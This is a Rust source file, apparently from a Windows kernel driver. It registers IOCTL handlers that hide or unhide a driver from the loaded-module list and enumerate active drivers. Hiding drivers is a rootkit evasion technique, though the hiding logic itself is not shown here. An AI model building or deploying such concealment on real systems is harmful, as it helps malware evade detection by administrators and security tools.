use {
    alloc::boxed::Box, 
    hashbrown::HashMap,
    wdk_sys::{IO_STACK_LOCATION, IRP, STATUS_SUCCESS},
    shared::{
        ioctls::{IOCTL_ENUMERATE_DRIVER, IOCTL_HIDE_UNHIDE_DRIVER}, 
        structs::{DriverInfo, TargetDriver}
    }, 
    crate::{
        driver::Driver, handle, utils::ioctls::IoctlHandler
    },
};

/// Registers the IOCTL handlers for driver-related operations.
///
/// This function inserts two IOCTL handlers into the provided `HashMap`, associating them with
/// their respective IOCTL codes. The two operations supported are:
///
/// # Parameters
/// 
/// - `ioctls`: A mutable reference to a `HashMap<u32, IoctlHandler>` where the driver-related
///   IOCTL handlers will be inserted.
///
pub fn get_driver_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
    // Hiding / Unhiding a driver from loaded modules.
    ioctls.insert(IOCTL_HIDE_UNHIDE_DRIVER, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let status = unsafe { handle!(stack, Driver::driver_toggle, TargetDriver) };
        unsafe { (*irp).IoStatus.Information = 0 };
        status
    }) as IoctlHandler);

    // Enumerate active drivers on the system.
    ioctls.insert(IOCTL_ENUMERATE_DRIVER, Box::new(|irp: *mut IRP, _: *mut IO_STACK_LOCATION | {
        let mut information = 0;
        let status = unsafe { handle!(irp, Driver::enumerate_driver, DriverInfo, &mut information) };
        unsafe { (*irp).IoStatus.Information = information as u64 };

        match status {
            Ok(_) => STATUS_SUCCESS,
            Err(err_code) => err_code
        }
    }) as IoctlHandler);
}